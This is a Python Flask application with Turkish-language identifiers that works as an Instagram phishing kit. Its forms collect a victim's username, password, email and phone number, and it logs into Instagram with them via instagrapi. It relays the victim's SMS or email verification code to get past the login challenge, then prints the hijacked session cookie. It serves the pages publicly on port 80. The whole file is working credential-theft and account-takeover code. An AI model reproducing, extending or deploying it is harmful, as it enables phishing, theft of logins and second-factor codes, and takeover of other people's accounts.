import threading
import instagrapi
from flask import Flask, request, render_template, redirect, url_for, abort
from instagrapi import Client
from instagrapi.mixins.challenge import ChallengeChoice
import asyncio
import time
import functools
import threading

app = Flask(__name__)
cl=[]
sifrehatali=False

kodistedimi = False
smssayfasindami = False

codee = ""








            
        
        


def get_code_from_sms(user):
    print(f"-SMS GELDI CODE {user}")
    global kodistedimi
    kodistedimi = True
    
    while smssayfasindami == False and codee != ""  :
        pass

    if codee and codee.isdigit():
        return codee
    return None

def get_code_from_email(user):
    print(f"EMAIL GELDI CODE {user}")
    global kodistedimi
    kodistedimi = True
    while smssayfasindami == False and codee != "":
        pass


    if codee and codee.isdigit():
        return codee
    return None

def challenge_code_handler(username, choice):

    if choice == ChallengeChoice.SMS:
        return get_code_from_sms(username)
    elif choice == ChallengeChoice.EMAIL:
        return get_code_from_email(username)
    return False
    




@app.route('/code')
def code():
    render_template('index.html')





@app.route('/')
def index():
    return render_template('index.html')





@app.route('/info', methods=['POST'])
def sonuc():
    sesion_id = request.form['username']
    return render_template('info.html', username=sesion_id)



@app.route('/sms', methods=['POST','GET'])
def sms():
    
    global smssayfasindami
    smssayfasindami = True


    return render_template('sms.html')


"####################################################VERIFY#####################################################"

@app.route('/verify', methods=['POST','GET'])
def verify():
    try:

        global codee





        codee = request.form['code']
        
        time.sleep(10)
        return render_template('finish.html')
    except:
        print("hata var")
        
        return  render_template('error.html')





def  logina(aliu,alip, cl):
    global kodistedimi
    global codee
    global sifrehatali
    # Your asynchronous code goes here
    # Example of an asynchronous I/O operatio
    print("Giris Yapılıyor Thread ")
    ahmetkaya= challenge_code_handler
    cl.challenge_code_handler =   ahmetkaya
    try:
        
        cl.login(aliu,str(alip))
        kayau=aliu
        
        kayap=alip
        kaya= cl.sessionid
        
        print("Coocies budurrr=  "+str(kaya))
        #teg(kayau,kayap,kaya)
        
        
        
        
        codee=""
        kodistedimi= False
    except Exception as e:
        print("hata var")
        print(e)
        sifrehatali=True 
    



async def oguzthread(loop,aliu,alip):
    print("THREAD FUNCTION CALISICAKKKK")
    login_partial = functools.partial(logina, aliu, alip)
    asyncio.set_event_loop(loop)
    await loop.run_until_complete(login_partial)



@app.route('/login', methods=['POST'])
async def login():
    
    global sifrehatali
    aliu=request.form['username']
    alip=request.form['pass']
    alim=request.form['mail']
    alin=request.form['number']

    try:

        print("Giriş Yapılıyor")
        yeni_cl= Client()
        cl.append(yeni_cl)



        
        
                        
        my_thread = threading.Thread(target=logina, args=(aliu, alip, yeni_cl))
        my_thread.start()
                
            
        time.sleep(15)

        if kodistedimi == True:
             
             return redirect("/sms")
        if sifrehatali == True:
            sifrehatali=False
            return render_template('error.html')

        
        
        
        
        
        print("giriş yapıldı")
        print("ametkaya: "+str(code))
        kaya= yeni_cl.sessionid
        
            
        
       
        
        print("Coocies budur=  "+str(kaya))
        print(str(aliu))

        return render_template('finish.html', username=aliu)

    except Exception as e:
        print("hata var")
        print(e)
        return  render_template('error.html')






if __name__:
    
    app.run(debug=True, host='0.0.0.0',port=80)
    